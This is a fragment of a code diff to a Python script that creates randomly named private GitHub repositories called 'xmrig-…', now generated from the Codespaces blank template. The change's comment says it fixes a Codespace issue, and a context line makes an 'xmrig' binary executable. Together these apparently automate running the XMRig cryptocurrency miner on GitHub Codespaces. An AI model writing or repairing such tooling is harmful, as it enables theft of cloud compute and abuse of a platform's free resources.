@@ -46,11 +46,18 @@ chmod +x xmrig
 
     for _ in range(2):
         repo_name = f"xmrig-{os.urandom(3).hex()}"
-        repo_resp = requests.post("https://api.github.com/user/repos", headers=headers, json={
-            "name": repo_name,
-            "private": True,
-            "auto_init": True
-        })
+
+        # ✅ Create repo from template (fixes Codespace issue)
+        repo_resp = requests.post(
+            "https://api.github.com/repos/github/codespaces-blank/generate",
+            headers={**headers, "Accept": "application/vnd.github+json"},
+            json={
+                "owner": username,
+                "name": repo_name,
+                "private": True,
+                "include_all_branches": False
+            }
+        )
         if repo_resp.status_code != 201:
             continue
 
